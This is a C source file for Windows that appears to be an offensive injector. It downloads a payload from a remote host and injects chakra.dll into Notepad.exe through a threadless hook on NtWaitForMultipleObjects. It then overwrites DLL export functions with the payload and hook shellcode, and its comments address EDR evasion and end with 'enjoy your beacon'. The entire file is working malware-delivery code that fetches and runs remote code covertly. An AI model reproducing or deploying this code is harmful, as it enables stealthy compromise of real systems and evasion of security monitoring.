#include <Windows.h>
#include <wininet.h>
#include <TlHelp32.h>
#include <stdio.h>
#include "psapi.h"
#include "Common.h"

#pragma comment (lib, "Wininet.lib")

#define PAYLOAD	L"http://192.168.150.134/caue.gif"
#define TARGET_PROCESS L"Notepad.exe"

// Stomping setup
#define DLLPATH L"C:\\Windows\\System32\\Chakra.dll"
#define DLLNAME "chakra.dll"
#define STOMPFUNC1 "MemProtectHeapUnprotectCurrentThread"
#define STOMPFUNC2 "DllCanUnloadNow"

// Threadless: function to hook in the target process
#define TARGETDLLNAME "ntdll.dll"
#define TARGETFUNC "NtWaitForMultipleObjects"

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

    BOOL		bSTATE = TRUE;
    HINTERNET	hInternet = NULL, hInternetFile = NULL;
    DWORD		dwBytesRead = NULL;
    SIZE_T		sSize = NULL;
    PBYTE		pBytes = NULL, pTmpBytes = NULL;

    hInternet = InternetOpenW(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36", NULL, NULL, NULL, NULL);
    if (hInternet == NULL) {
        printf("[-] InternetOpenW Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    // Opening the handle to the payload using the payload's URL
    hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
    if (hInternetFile == NULL) {
        printf("[-] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    // Allocating 1024 bytes to the temp buffer
    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
    if (pTmpBytes == NULL) {
        bSTATE = FALSE; goto _EndOfFunction;
    }

    while (TRUE) {

        if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
            printf("[-] InternetReadFile Failed With Error : %d \n", GetLastError());
            bSTATE = FALSE; goto _EndOfFunction;
        }

        sSize += dwBytesRead;

        if (pBytes == NULL)
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        else

            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

        if (pBytes == NULL) {
            bSTATE = FALSE; goto _EndOfFunction;
        }

        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

        memset(pTmpBytes, '\0', dwBytesRead);

        if (dwBytesRead < 1024) {
            break;
        }
    }

    // Saving 
    *pPayloadBytes = pBytes;
    *sPayloadSize = sSize;

_EndOfFunction:
    if (hInternet)
        InternetCloseHandle(hInternet);
    if (hInternetFile)
        InternetCloseHandle(hInternetFile);
    if (hInternet)
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
    if (pTmpBytes)
        LocalFree(pTmpBytes);
    return bSTATE;
}

LPCWSTR GetIntegrityLevel(HANDLE hProcess) {
    HANDLE hToken;
    OpenProcessToken(hProcess, TOKEN_QUERY, &hToken);

    DWORD cbTokenIL = 0;
    PTOKEN_MANDATORY_LABEL pTokenIL = NULL;
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &cbTokenIL);
    pTokenIL = (TOKEN_MANDATORY_LABEL*)LocalAlloc(LPTR, cbTokenIL);
    GetTokenInformation(hToken, TokenIntegrityLevel, pTokenIL, cbTokenIL, &cbTokenIL);

    DWORD dwIntegrityLevel = *GetSidSubAuthority(pTokenIL->Label.Sid, 0);

    if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) {
        return L"LOW";
    }
    else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID && dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID) {
        return L"MEDIUM";
    }
    else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID) {
        return L"HIGH";
    }
    else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID) {
        return L"SYSTEM";
    }
}

HANDLE GetProcHandlebyName(LPCWSTR procName, DWORD* PID) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hProc = NULL;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (!snapshot) {
        printf("[-] Cannot retrieve the processes snapshot. Error code: %lu\n", GetLastError());
        return NULL;
    }

    if (Process32First(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, procName) == 0) {
                *PID = entry.th32ProcessID;
                hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *PID);

                if (!hProc) {
                    DWORD error = GetLastError();
                    printf("[-] Failed to open process for %ls (PID: %d). Error code: %lu\n", entry.szExeFile, *PID, error);

                    // Additional information for debugging purposes
                    if (error == ERROR_ACCESS_DENIED) {
                        printf("[-] Access Denied. Ensure that your application has the necessary permissions.\n");
                    }
                    else if (error == ERROR_FILE_NOT_FOUND) {
                        printf("[-] Process not found or already terminated.\n");
                    } 
                    continue;
                }

                printf("[i] Injecting into: %ls (PID: %d)\n", entry.szExeFile, *PID);
                return hProc;
            }
        } while (Process32Next(snapshot, &entry));
    }

    printf("[-] Process not found: %ls\n", procName);
    return NULL;
}

BOOL ThreadlessThread(HANDLE processHandle, PVOID executableCodeAddress) {
    NTSTATUS	STATUS = NULL;
    PBYTE trampoline = calloc(76, sizeof(BYTE));
    if (!trampoline) { return FALSE; }

    // This trampoline is used to save the function inital context and redirect to
    // the memory space containing the malicious code. Then, once the malicious code
    // is executed, it will restore the context and redirect to the initial code.
    BYTE trampolineStk[75] = {
        0x58,                                                           // pop RAX
        0x48, 0x83, 0xe8, 0x0c,                                         // sub RAX, 0x0C                    : when the function will return, it will not return to the next instruction but to the previous one
        0x50,                                                           // push RAX
        0x55,															// PUSH RBP
        0x48, 0x89, 0xE5,                                               // MOV RBP, RSP
        0x48, 0x83, 0xec, 0x08,                                         // SUB RSP, 0x08                    : always equal to 8%16 to have an aligned stack. It is mandatory for some function call
        0x51,                                                           // push RCX                         : just save the context registers
        0x52,                                                           // push RDX
        0x41, 0x50,                                                     // push R8
        0x41, 0x51,                                                     // push R9
        0x41, 0x52,                                                     // push R10
        0x41, 0x53,                                                     // push R11
        0x48, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // movabs RCX, 0x0000000000000000   : restore the hooked function code
        0x48, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // movabs RDX, 0x0000000000000000   : restore the hooked function code
        0x48, 0x89, 0x08,                                               // mov qword ptr[rax], rcx          : restore the hooked function code
        0x48, 0x89, 0x50, 0x08,                                         // mov qword ptr[rax+0x8], rdx      : restore the hooked function code
        0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // mov RAX, 0x0000000000000000      : Address where the execution flow will be redirected
        0xff, 0xd0,                                                     // call RAX                         : Call the malicious code
        0x41, 0x5b,                                                     // pop R11                          : Restore the context
        0x41, 0x5a,                                                     // pop R10
        0x41, 0x59,                                                     // pop R9
        0x41, 0x58,                                                     // pop R8
        0x5a,                                                           // pop RDX
        0x59,                                                           // pop RCX
        0xc9,                                                           // leave
        0xc3                                                            // ret      
    };
    DWORD trampSize = 75;
    CopyMemory(trampoline, trampolineStk, trampSize * sizeof(BYTE));

    DWORD64 highBytePatched = 0;
    DWORD64 lowBytePatched = 0;
    SIZE_T szOutput = 0;

    // Get address of target function
    HMODULE dllBase = GetModuleHandleA(TARGETDLLNAME);
    if (dllBase == NULL)
    {
        printf("[-] Unable to locate base address of %s", TARGETDLLNAME);
        return -1;
    }

    UINT_PTR exportAddress = (UINT_PTR)GetProcAddress(dllBase, TARGETFUNC);
    if (exportAddress == 0)
    {
        printf("[-] Unable to locate base address of %s", TARGETFUNC);
        return -1;
    }


    // Save the instruction of the hooked function
    ReadProcessMemory(processHandle, (PVOID)exportAddress, &highBytePatched, sizeof(DWORD64), &szOutput);
    ReadProcessMemory(processHandle, (PVOID)((DWORD64)exportAddress + sizeof(DWORD64)), &lowBytePatched, sizeof(DWORD64), &szOutput);

    PVOID pageToProtect = exportAddress;


    SIZE_T pageSize = 2 * sizeof(DWORD64);
    DWORD oldProtect;

    
    if (!VirtualProtectEx(processHandle, (PVOID)exportAddress, 2 * sizeof(DWORD64), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[-] VirtualProtectEx Failed With Error : %d \n", GetLastError());
    }
    DWORD64 tmp = highBytePatched;

    // Replace the place holders in the trampoline shellcode
    // with the righ values
    CopyMemory(trampoline + 26, &highBytePatched, sizeof(DWORD64));
    CopyMemory(trampoline + 36, &lowBytePatched, sizeof(DWORD64));
    CopyMemory(trampoline + 53, &executableCodeAddress, sizeof(DWORD64));

    // Write the trampoline somewhere in memory
    // Here VirtualAlloc is used, but some code cave can be used to limit this call
    // As the trampoline size is lesser than 4Ko, we should be ok for EDR detections
    PVOID trampolineAddress = NULL;
    SIZE_T trampolineSize = trampSize * sizeof(BYTE);

    
    trampolineAddress = VirtualAllocEx(processHandle, NULL, trampolineSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (trampolineAddress == NULL) {
		printf("[-] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

    WriteProcessMemory(processHandle, trampolineAddress, trampoline, trampolineSize, &szOutput);

    if (!VirtualProtectEx(processHandle, trampolineAddress, trampolineSize, PAGE_EXECUTE_READ, &szOutput)) {
        printf("[-] VirtualProtectEx Failed With Error : %d \n", GetLastError());
    }
    printf("\n[i] Trampoline written at : %p\n", trampolineAddress);

    // Create the hook that will be placed in the remote function
    PBYTE shellcode = calloc(12, sizeof(BYTE));
    if (!shellcode) { return FALSE; }
    BYTE shellcodeStk[12] = {
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov RAX, 0x0000000000000000
        0xFF, 0xD0                                                  // call RAX
    };

    // Replace the place holder
    CopyMemory(shellcode, shellcodeStk, 12 * sizeof(BYTE));
    CopyMemory(shellcode + 2, &trampolineAddress, sizeof(DWORD64));

    // Write the hook in memory
    WriteProcessMemory(processHandle, (PVOID)exportAddress, shellcode, 12, &szOutput);

    PBYTE exportContent = calloc(12, sizeof(BYTE));
    if (!exportContent) { return FALSE; }
    DWORD hookCalled = 0;

    do {
        printf("\t[i] Waiting 5 seconds for the hook to be called...\n");
        Sleep(5000);
        // Check if the hook has been re-patched ie has been successfully executed
        ReadProcessMemory(processHandle, (PVOID)exportAddress, exportContent, 12, &szOutput);
        hookCalled = memcmp(shellcode, exportContent, 12 * sizeof(BYTE));
    } while (!hookCalled);

    // Just remove all artifacts in memory
    printf("\t[i] Hook called!!\n");

    VirtualFreeEx(processHandle, trampolineAddress, trampolineSize, MEM_DECOMMIT | MEM_RELEASE);

    if (!VirtualProtectEx(processHandle, (PVOID)exportAddress, 2 * sizeof(DWORD64), oldProtect, &oldProtect)) {
        printf("[-] VirtualProtectEx Failed With Error : %d \n", GetLastError());
    }

    free(shellcode);
    free(trampoline);
    free(exportContent);

    return TRUE;
}

BOOL InjectDllToRemoteProcess(HANDLE hProcess, LPWSTR DllName) {

    BOOL		bSTATE = TRUE;
    LPVOID		pLoadLibraryW = NULL;
    LPVOID		pAddress = NULL;
    DWORD		dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);
    SIZE_T		lpNumberOfBytesWritten = NULL;
    HANDLE		hThread = NULL;
    NTSTATUS	STATUS = NULL;

    // Getting the base address of LoadLibraryW function
    pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
    if (pLoadLibraryW == NULL) {
        printf("[-] GetProcAddress Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }
    // Allocating memory in hProcess of size dwSizeToWrite and memory permissions set to read and write
    pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        printf("[-] VirtualAllocEx Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }
    printf("[i] Allocated buffer of %d bytes at 0x%p\n", dwSizeToWrite, pAddress);


    // Writing DllName to the allocated memory pAddress
    if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite) {
        printf("[-] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }
    printf("[i] DLL name successfully written at 0x%p\n", pAddress);

    // Simple shellcode that will call LoadLibraryW with the given parameters
    BYTE loadLibraryStk[32] = {
        0x55,															// PUSH RBP
        0x48, 0x89, 0xE5,												// MOV RBP, RSP
        0x48, 0x83, 0xEC, 0x30,											// SUB RSP, 0x30 : space needed for LoadLibrary to not fuck the stack
        0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // MOV RCX, 0x0000000000000000  -> module name
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // MOV RAX, 0x0000000000000000  -> loadLibraryW address
        0xFF, 0xD0,														// CALL RAX
        0xC9,															// LEAVE
        0xC3,															// RET
    };

    PBYTE loadLibrary = calloc(32, sizeof(BYTE));
    if (!loadLibrary) { return FALSE; }
    // Replace the placeholders
    CopyMemory(loadLibrary, loadLibraryStk, 32 * sizeof(BYTE));
    CopyMemory(loadLibrary + 10, &pAddress, sizeof(DWORD64));
    CopyMemory(loadLibrary + 20, &pLoadLibraryW, sizeof(DWORD64));

    PVOID loadLibraryAddress = NULL;
    SIZE_T pageSize = 32 * sizeof(BYTE);
    SIZE_T szOutput;

    loadLibraryAddress = VirtualAllocEx(hProcess, NULL, pageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        printf("[-] VirtualAllocEx Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    if (!WriteProcessMemory(hProcess, loadLibraryAddress, loadLibrary, pageSize, &szOutput) || szOutput != pageSize) {
        printf("[-] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    if (!VirtualProtectEx(hProcess, loadLibraryAddress, pageSize, PAGE_EXECUTE_READ, &szOutput)) {
        printf("[-] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}
    printf("[i] LoadLibrary address : 0x%p\n", loadLibraryAddress);

    // Run the threadless thread
    ThreadlessThread(hProcess, loadLibraryAddress);
    printf("\t[i] DLL injected\n");

    // Clean the shellcode from memory
    VirtualFreeEx(hProcess, loadLibraryAddress, pageSize, MEM_DECOMMIT | MEM_RELEASE);


    return TRUE;

_EndOfFunction:
    if (hThread)
        CloseHandle(hThread);
    return bSTATE;
}

DWORD64 GetDLLBaseAddress(HANDLE processHandle, char* dllName) {
    HMODULE modules[1024];
    SIZE_T modulesSize = sizeof(modules);
    DWORD modulesSizeNeeded = 0;

    // Retrieve the list of the modules directly from the PEB on the
    // remote process
    EnumProcessModules(processHandle, modules, modulesSize, &modulesSizeNeeded);
    SIZE_T modulesCount = modulesSizeNeeded / sizeof(HMODULE);

    // Enumerate all modules until the wanted one is found
    for (size_t i = 0; i < modulesCount; i++) {
        HMODULE remoteModule = modules[i];
        CHAR remoteModuleName[128];
        // Retrieve the module name
        GetModuleBaseNameA(
            processHandle,
            remoteModule,
            remoteModuleName,
            sizeof(remoteModuleName)
        );

        // Return the module address if the name match
        if (_stricmp(remoteModuleName, dllName) == 0) {
            return (DWORD64)modules[i];
        }
    }
    return -1;
}

DWORD64 GetProcAddressEx(HANDLE processHandle, DWORD64 baseAddress, char* functionName) {
    // This function will retrieve the DLL PE Header and enumerate its export directory
    // until it find the function name.

    void* buffer = calloc(0x1000, sizeof(char));
    if (!buffer) {
        return NULL;
    }
    DWORD bufferSize = 0x1000;

    // Retrieve the PE header bytes to access to the DLL export directory
    DWORD status = ReadProcessMemory(processHandle, (PVOID)baseAddress, buffer, bufferSize, NULL);
    if (!status) {
        printf("[-] Cannot read process memory : %d\n", GetLastError());
        return -1;
    }

    // Map the retrieved byte to the PE header structures
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buffer;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)buffer + dosHeader->e_lfanew);
    IMAGE_DATA_DIRECTORY* dataDirectory = ntHeader->OptionalHeader.DataDirectory;

    // Retrieve the export directory address
    DWORD exportDirectoryRVA = dataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    IMAGE_EXPORT_DIRECTORY exportDirectory;

    // Retrieve the export directory content
    status = ReadProcessMemory(processHandle, (PVOID)(exportDirectoryRVA + baseAddress), &exportDirectory, sizeof(IMAGE_EXPORT_DIRECTORY), NULL);
    if (!status) {
        printf("[-] Cannot read export directory : %d\n", GetLastError());
        return -1;
    }

    // Once the export directory is found, just enumerate each entry
    for (int i = 0; i < exportDirectory.NumberOfFunctions; i++) {
        char* name = calloc(100, sizeof(char));
        if (!name) {
            printf("[-] Cannot allocate function name buffer\n");
            return -1;
        }
        DWORD offset;

        // Read the process memory to retrieve the address where the name of the current function
        // is stored
        status = ReadProcessMemory(processHandle, baseAddress + exportDirectory.AddressOfNames + i * sizeof(DWORD), &offset, sizeof(DWORD), NULL);
        if (!status) {
            printf("[-] Cannot read address of names : \n", GetLastError());
            return -1;
        }

        // Then retrieve the name of the function
        PVOID nameAddress = ((DWORD64)baseAddress + offset);
        status = ReadProcessMemory(processHandle, nameAddress, name, 100, NULL);
        if (!status) {
            printf("[-] Cannot read name address : %d\n", GetLastError());
            return -1;
        }

        // If the function is the one we want
        if (strcmp(name, functionName) == 0) {
            WORD offsetOrdinal = -1;
            DWORD offsetFunction = -1;

            // Retrieve its ordinal to get its offset in the memory
            status = ReadProcessMemory(processHandle, baseAddress + exportDirectory.AddressOfNameOrdinals + i * sizeof(WORD), &offsetOrdinal, sizeof(WORD), NULL);
            if (!status) {
                printf("[-] Cannot read ordinal value : %d\n", GetLastError());
                return -1;
            }

            // Finally, retrieve its RVA
            status = ReadProcessMemory(processHandle, baseAddress + exportDirectory.AddressOfFunctions + offsetOrdinal * sizeof(DWORD), &offsetFunction, sizeof(DWORD), NULL);
            if (!status) {
                printf("[-] Cannot read function RVA : %d\n", GetLastError());
                return -1;
            }

            // That's it, return the function address
            DWORD64 functionAddr = baseAddress + offsetFunction;
            return functionAddr;
        }
    }

    return -1;

}

int main()
{
    SIZE_T  Size = NULL;
    PBYTE   Bytes = NULL;
    DWORD   pid = NULL;
    DWORD   dwOldProtection = NULL;
    DWORD   dwHookOriginalProtection = NULL;
    SIZE_T  sNumberOfBytesWritten = NULL;

    printf("[i] Fetching the payload from the internet\n");
    //Download payload
    if (!GetPayloadFromUrl(PAYLOAD, &Bytes, &Size)) {
        return -1;
    }
    // Payload size
    printf("\t[i] Downloaded payload size: %lukb\n", Size);

    // Get a handle to the target process
    HANDLE procHandle = GetProcHandlebyName(TARGET_PROCESS, &pid);
    if (!procHandle) {
        printf("[-] Cannot get process handle\n");
        return -1;
    }

    // Inject the DLL into the target process
    BOOL injectionStatus = InjectDllToRemoteProcess(procHandle, DLLPATH);
    if (!injectionStatus) {
        printf("[-] Cannot inject the DLL\n");
        return -1;
    }

    DWORD64 dllBaseAddress = GetDLLBaseAddress(procHandle, DLLNAME);
    if (dllBaseAddress == -1) {
        printf("[-] Cannot find dll base address\n");
        return -1;
    }

    printf("\n[i] Looking for the function addresses we will stomp\n");
    // Here we will store the payload
    DWORD64 payloadAddr = GetProcAddressEx(procHandle, dllBaseAddress, STOMPFUNC1);
    if (payloadAddr == -1) {
        printf("[-] Cannot find the MemProtectHeapUnprotectCurrentThread address\n");
        return -1;
    }
    printf("\t[i] Found %s address at 0x%p\n", STOMPFUNC1, payloadAddr);

    // Here we will store the custom hook
    DWORD64 entryPoint = GetProcAddressEx(procHandle, dllBaseAddress, STOMPFUNC2);
    if (entryPoint == -1) {
        printf("[-] Cannot find the DllCanUnloadNow address\n");
        return -1;
    }
    printf("\t[i] Found %s address at 0x%p\n", STOMPFUNC2, entryPoint);

    // Write payload into entryPoint
    printf("\n[i] Writing payload to entrypoint\n");
    if (!VirtualProtectEx(procHandle, payloadAddr, Size, PAGE_READWRITE, &dwOldProtection)) {
        printf("[-] VirtualProtectEx [RW] Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("\t[i] Changed protection to RW: 0x%p\n", payloadAddr);

    if (!WriteProcessMemory(procHandle, payloadAddr, Bytes, Size, &sNumberOfBytesWritten)) {
        printf("\n\t[-] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        return -1;
    }
    printf("\t[i] Written %d payload bytes\n", sNumberOfBytesWritten);

    // Now we need to modify the custom hook to redirect the flow to the payload address
    printf("\n------------------------------------------------------------------------------------------------\n");
    printf("[i] Looking for the 1st egg and replace it with the payload address\n");
    int hookShellcodeBytesLen = sizeof(hookShellcode) / sizeof(hookShellcode[0]);
    int eggIndex = 0;

    for (int i = 0; i < hookShellcodeBytesLen; ++i) {
        if (hookShellcode[i] == 0x88 &&
            hookShellcode[i + 1] == 0x88 &&
            hookShellcode[i + 2] == 0x88 &&
            hookShellcode[i + 3] == 0x88 &&
            hookShellcode[i + 4] == 0x88 &&
            hookShellcode[i + 5] == 0x88) {
            printf("\t[i] Found egg at index: %d\n", i);
            eggIndex = i;
            break;
        }
    }

    printf("\t[i] Writing the payload memory address into egg: 0x%p\n", payloadAddr);
    memcpy((void*)&hookShellcode[eggIndex], &payloadAddr, 8);

    printf("------------------------------------------------------------------------------------------------\n");
    eggIndex = 0;
    printf("[i] Looking for the 2nd egg, which will be filled with the same address to jump there at the end\n");

    for (int i = 0; i < hookShellcodeBytesLen; ++i) {
        if (hookShellcode[i] == 0x49 &&
            hookShellcode[i + 1] == 0xBA &&
            hookShellcode[i + 2] == 0x00 &&
            hookShellcode[i + 3] == 0x00 &&
            hookShellcode[i + 4] == 0x00 &&
            hookShellcode[i + 5] == 0x00 &&
            hookShellcode[i + 6] == 0x00 &&
            hookShellcode[i + 7] == 0x00 &&
            hookShellcode[i + 8] == 0x00 &&
            hookShellcode[i + 9] == 0x00 &&
            hookShellcode[i + 10] == 0x41 &&
            hookShellcode[i + 11] == 0xFF &&
            hookShellcode[i + 12] == 0xE2) {

            printf("\t[i] Found egg at index: %d\n", i);
            // our 0x00 bytes start at position three, so we need to add three to the index
            eggIndex = i + 2;
            break;
        }
    }
    printf("\t[i] Writing the payload memory address into egg: 0x%p\n", payloadAddr);
    memcpy((void*)&hookShellcode[eggIndex], &payloadAddr, 8);

    printf("------------------------------------------------------------------------------------------------\n");
    eggIndex = 0;
    printf("[i] Looking for the 3rd egg, which will be filled with the length of the payload\n");
    for (int i = 0; i < hookShellcodeBytesLen; ++i) {
        if (hookShellcode[i] == 0xDE &&
            hookShellcode[i + 1] == 0xAD &&
            hookShellcode[i + 2] == 0x10 &&
            hookShellcode[i + 3] == 0xAF) {
            printf("\t[i] Found egg at index: %d\n", i);
            eggIndex = i;
            break;
        }
    }

    printf("\t[i] Writing shellcode length into the egg: %d\n", Size);
    memcpy((void*)&hookShellcode[eggIndex], (void*)&Size, 8);

    Sleep(2000);

    printf("------------------------------------------------------------------------------------------------\n");

    // Before writing the hookShellcode into DllCanUnloadNow, we save the original bytes to restore later
    printf("\n[i] Saving the original bytes of DllCanUnloadNow\n");
    SIZE_T sz;
    PBYTE saveFunction = calloc(sizeof(hookShellcode), sizeof(BYTE));
    DWORD status = ReadProcessMemory(procHandle, entryPoint, saveFunction, hookShellcodeBytesLen * sizeof(BYTE), &sz);
    if (!status) {
        printf("[-] Cannot read process memory to get stomped function code: %d\n", GetLastError());
        return -1;
    }

    // Finally write the hookShellcode shellcode into the DllCanUnloadNow function
    if (!VirtualProtectEx(procHandle, entryPoint, hookShellcodeBytesLen, PAGE_READWRITE, &dwHookOriginalProtection)) {
        printf("[-] VirtualProtectEx [RW] Failed With Error : %d \n", GetLastError());
        return -1;
    }

    printf("[i] Writing the custom shellcode (hook) in the DllCanUnloadNow address\n");
    if (!WriteProcessMemory(procHandle, entryPoint, hookShellcode, hookShellcodeBytesLen, &sNumberOfBytesWritten)) {
        printf("\n\t[-] WriteProcessMemory 2 Failed With Error : %d \n", GetLastError());
        return -1;
    }
    printf("\t[i] Written %d bytes", sNumberOfBytesWritten);

    if (!VirtualProtectEx(procHandle, entryPoint, hookShellcodeBytesLen, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[-] VirtualProtectEx [RWX] Failed With Error : %d \n", GetLastError());
        return -1;
    }

    Sleep(2000);

    // Run the threadless thread to call the entry point
    ThreadlessThread(procHandle, (PVOID)entryPoint);
    printf("[i] Calling the entry point, enjoy your beacon\n");

    // Restore the original bytes of DllCanUnloadNow
    Sleep(12000);
    printf("[i] Restoring the function back to its original state: 0x%p\n", entryPoint);
    status = WriteProcessMemory(procHandle, entryPoint, saveFunction, hookShellcodeBytesLen * sizeof(BYTE), &sz);
    if (!status) {
        printf("[-] Cannot rewrite initial code in process memory : %d\n", GetLastError());
        return -1;
    }
    printf("\t[i] Original bytes of DllCanUnloadNow reverted!\n");

    if (!VirtualProtectEx(procHandle, entryPoint, hookShellcodeBytesLen, dwHookOriginalProtection, &dwOldProtection)) {
        printf("[-] VirtualProtectEx [RWX] Failed With Error : %d \n", GetLastError());
        return -1;
    }
    printf("\t[i] Memory protection reverted to: %d\n", dwHookOriginalProtection);
    
	return 0;
}
